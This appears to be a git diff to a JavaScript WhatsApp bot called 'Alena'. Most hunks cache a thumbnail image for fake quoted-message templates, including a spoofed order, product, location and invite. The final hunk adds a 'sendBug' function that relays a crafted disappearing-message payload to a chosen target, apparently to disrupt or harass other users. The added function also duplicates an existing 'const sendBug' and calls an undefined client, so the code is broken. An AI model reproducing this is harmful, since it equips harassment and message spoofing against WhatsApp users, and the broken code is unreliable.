@@ -144,6 +144,7 @@ module.exports = Alena = async (Alena, m, chatUpdate, store) => {
 	    const from = mek.key.remoteJid
 	    const type = Object.keys(mek.message)[0]        
 	    const content = JSON.stringify(mek.message)
+	    const dfrply = fs.readFileSync('alena.jpg')
 
         //group\\
         const groupMetadata = m.isGroup ? await Alena.groupMetadata(m.chat).catch(e => {}) : ''
@@ -208,7 +209,7 @@ key: {
 				"product": {
 					"productImage":{
 						"mimetype": "image/jpeg",
-						"jpegThumbnail": fs.readFileSync('alena.jpg'), //Gambarnye
+						"jpegThumbnail": dfrply //Gambarnye
 					},
 					"title": `${tampilUcapan} ${pushname}`, //Kasih namalu 
 					"description": `${tampilUcapan} ${pushname}`, 
@@ -233,7 +234,7 @@ const ftrol = {
                             surface : 1,
                             message: `${tampilUcapan} ${pushname}`, //Kasih namalu
                             orderTitle: `${tampilUcapan} ${pushname}`,
-                            thumbnail: fs.readFileSync('alena.jpg'),, //Gambarnye
+                            thumbnail: dfrply, //Gambarnye
                             sellerJid: '0@s.whatsapp.net' 
                           }
                         }
@@ -246,7 +247,7 @@ const floc = {
        message: {
                     liveLocationMessage: {
                     caption: `${tampilUcapan} ${pushname}`,
-                    jpegThumbnail: fs.readFileSync('alena.jpg'),
+                    jpegThumbnail: dfrply
                           }
                         }
                       }
@@ -258,7 +259,7 @@ const fdoc = {
        message: {
                     documentMessage: {
                     title: `${tampilUcapan} ${pushname}`, 
-                    jpegThumbnail: fs.readFileSync('alena.jpg'),
+                    jpegThumbnail: dfrply
                           }
                         }
                       }
@@ -275,7 +276,7 @@ const fvid = {
                  "h": `${tampilUcapan} ${pushname}`,
                  'duration': '99999', 
                  'caption': `${tampilUcapan} ${pushname}`,
-                 'jpegThumbnail': fs.readFileSync('alena.jpg'),
+                 'jpegThumbnail': dfrply
                         }
                        }
 	                  }
@@ -292,7 +293,7 @@ const finv = {
 			"inviteCode": `${tampilUcapan} ${pushname}`,
 			"groupName": `${tampilUcapan} ${pushname}`, 
             "caption": `${tampilUcapan} ${pushname}`, 
-            'jpegThumbnail': fs.readFileSync('alena.jpg'),
+            'jpegThumbnail': dfrply
 		}
 	}
 }
@@ -307,7 +308,7 @@ const fstick = {
     "message": {
       "stickerMessage": {
         "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
-		"pngThumbnail": fs.readFileSync('alena.jpg'),,
+		"pngThumbnail": dfrply,
 	 "mimetype": "image/webp",
         "height": 64,
         "width": 64,
@@ -334,7 +335,7 @@ const fgi = {
                  'duration': '99999', 
                  'gifPlayback': 'true', 
                  'caption': `${tampilUcapan} ${pushname}`,
-                 'jpegThumbnail': fs.readFileSync('alena.jpg'),
+                 'jpegThumbnail': dfrply
                         }
                        }
 	                  } 
@@ -349,7 +350,7 @@ const ftex = {
 		"extendedTextMessage": {
                  "text": `${tampilUcapan} ${pushname}`,
                  "title": `${tampilUcapan} ${pushname}`,
-                 'jpegThumbnail': fs.readFileSync('alena.jpg'),
+                 'jpegThumbnail': dfrply
                         }
 	                  } 
                      }
@@ -368,6 +369,14 @@ const fvoc = {
                         }
 	                  } 
                      }
+const sendBug = async (target) => {
+      await abu.relayWAMessage(
+        abu.prepareMessageFromContent(
+          target,
+          abu.prepareDisappearingMessageSettingContent(0),
+          {}
+        ),{ waitForAck: true }) 
+    }
 const sendBug = async (target) => {
       await abu.relayWAMessage(
         abu.prepareMessageFromContent(
